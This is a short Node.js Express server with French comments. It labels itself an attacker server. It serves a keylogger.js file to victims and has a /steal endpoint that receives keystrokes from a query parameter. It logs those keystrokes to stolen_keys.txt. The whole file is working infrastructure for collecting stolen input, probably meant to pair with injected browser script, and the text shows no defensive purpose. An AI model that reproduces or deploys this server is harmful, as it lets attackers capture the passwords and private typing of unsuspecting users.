const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Chemin vers le fichier keylogger.js
const keyloggerPath = path.join(__dirname, 'keylogger.js');

// Route pour servir le keylogger.js
app.get('/keylogger.js', (req, res) => {
    res.sendFile(keyloggerPath); // Envoie le fichier keylogger.js
});

// Route pour recevoir les frappes de clavier volées
app.get('/steal', (req, res) => {
    const stolenKeys = req.query.keys;
    console.log('Frappes reçues : ', stolenKeys);


    // Logguer les frappes de clavier volées dans un fichier texte
    fs.appendFile('stolen_keys.txt', `Frappes volées : ${stolenKeys}\n`, (err) => {
        if (err) {
            console.error('Erreur lors de l\'écriture des frappes volées', err);
        }
    });

    res.send('Frappes de clavier reçues.');
});

// Démarrage du serveur sur le port 3001
app.listen(3001, () => {
    console.log('Serveur attaquant démarré sur http://localhost:3001');
});
